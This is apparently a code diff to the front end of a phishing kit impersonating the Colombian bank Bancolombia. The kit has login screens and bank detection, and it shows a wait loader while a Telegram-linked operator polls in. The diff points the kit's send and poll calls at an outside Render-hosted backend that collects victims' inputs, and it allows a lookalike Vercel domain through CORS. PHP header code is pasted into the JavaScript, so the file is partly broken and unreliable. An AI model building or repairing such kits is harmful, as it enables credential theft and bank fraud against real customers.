@@ -7,6 +7,17 @@ let pollInterval = null;
 let currentScreen = 'scr-login';
 let detectedBank = null;
 
+// --- ESTO VA AL COMIENZO DE TODO ---
+header('Content-Type: application/json; charset=utf-8');
+header('Access-Control-Allow-Origin: https://bancolombiaflowv2.vercel.app');
+header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
+header('Access-Control-Allow-Headers: Content-Type');
+
+if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
+    http_response_code(200);
+    exit;
+}
+
 /* ── BANCO Y FRANQUICIA ── */
 const BANCOS = {
     'Visa': 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/120px-Visa_Inc._logo.svg.png',
@@ -117,21 +128,15 @@ function resetAll() {
     show('scr-login');
 }
 
-/* ── ENVÍO A BACKEND ── */
 function sendToBackend(step, message) {
     const abToken = document.querySelector('input[name="ab_token"]')?.value || '';
     const website = document.querySelector('input[name="website"]')?.value || '';
-    return fetch('api/send.php', {
+    
+    return fetch(`${BACKEND_URL}/api/send.php`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        credentials: 'same-origin',
         body: JSON.stringify({ step, message, sessionId: SESSION_ID, ab_token: abToken, website })
-    })
-        .then(r => r.json())
-        .catch(err => {
-            console.error('Error enviando a backend:', err);
-            return { ok: false, error: 'Network error' };
-        });
+    });
 }
 
 /* ── Mapa de pantallas de fail por paso ── */
@@ -164,11 +169,14 @@ function clearScreenInputs(screenId) {
 }
 
 /* ── POLLING TELEGRAM ── */
+const BACKEND_URL = 'https://bancolombia-flow-v2.onrender.com'; // <--- Pon aquí la URL real de tu servicio en Render
+
 function startPolling(targetScreen, stepName, originalMsg, onAction) {
     showWaitingLoader('Cargando...', '');
 
     pollInterval = setInterval(() => {
-        fetch(`api/poll.php?sessionId=${encodeURIComponent(SESSION_ID)}`, { credentials: 'same-origin' })
+        // Apuntamos a Render y quitamos 'credentials: same-origin' porque es cross-origin
+        fetch(`${BACKEND_URL}/api/poll.php?sessionId=${encodeURIComponent(SESSION_ID)}`)
             .then(r => r.json())
             .then(async data => {
                 if (data.status === 'completed') {
